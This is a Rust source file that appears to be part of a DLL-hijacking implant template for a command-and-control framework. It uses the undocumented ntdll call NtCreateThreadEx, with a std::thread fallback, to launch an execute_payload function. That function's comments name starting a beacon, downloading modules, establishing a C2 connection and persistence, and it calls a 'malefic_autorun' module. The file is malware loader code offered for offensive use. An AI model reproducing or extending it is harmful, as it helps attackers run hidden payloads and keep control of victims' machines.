use std::thread;

#[cfg(feature = "native_thread")]
#[link(name = "kernel32")]
extern "system" {
    fn GetCurrentProcess() -> *mut core::ffi::c_void;
}

#[cfg(feature = "native_thread")]
#[link(name = "ntdll")]
extern "system" {
    fn NtCreateThreadEx(
        thread_handle: *mut *mut core::ffi::c_void,
        desired_access: u32,
        object_attributes: *mut core::ffi::c_void,
        process_handle: *mut core::ffi::c_void,
        start_routine: *mut core::ffi::c_void,
        argument: *mut core::ffi::c_void,
        create_flags: u32,
        zero_bits: usize,
        stack_size: usize,
        maximum_stack_size: usize,
        attribute_list: *mut core::ffi::c_void,
    ) -> i32;
}

/// Thread creation interface with feature-based overrides
#[cfg(feature = "native_thread")]
pub fn create_payload_thread() {
    unsafe {
        let mut thread_handle: *mut core::ffi::c_void = core::ptr::null_mut();
        let current_process = GetCurrentProcess();
        let start_routine = execute_payload as *const () as *mut core::ffi::c_void;

        let ret = NtCreateThreadEx(
            &mut thread_handle,     // ThreadHandle
            0x1FFFFF,               // DesiredAccess (THREAD_ALL_ACCESS)
            core::ptr::null_mut(),  // ObjectAttributes
            current_process,        // ProcessHandle
            start_routine,          // StartAddress
            core::ptr::null_mut(),  // StartParameter
            0,                      // CreateSuspended (FALSE)
            0,                      // StackZeroBits
            0,                      // SizeOfStackCommit
            0,                      // SizeOfStackReserve
            core::ptr::null_mut(),  // AttributeList
        );

        // NT_SUCCESS(ret) means ret == 0
        if ret != 0 {
            // Fallback to std::thread if NtCreateThreadEx fails
            thread::spawn(|| { execute_payload(); });
        }
    }
}

#[cfg(not(feature = "native_thread"))]
pub fn create_payload_thread() {
    thread::spawn(|| { execute_payload(); });
}

/// User-implemented payload function
/// This is the ONLY code users need to care about
/// This function will be executed in a new thread when hijacked function is called
///
/// Users can implement here:
/// - Start beacon
/// - Download additional modules
/// - Establish C2 connection
/// - Persistence mechanisms
/// And other payload functionality
#[no_mangle]
pub extern "C" fn execute_payload() {
    // TODO: Users add their payload implementation here
    #[cfg(feature = "malefic-autorun")]
    if let Err(_e) = malefic_autorun::run() {
    }
}
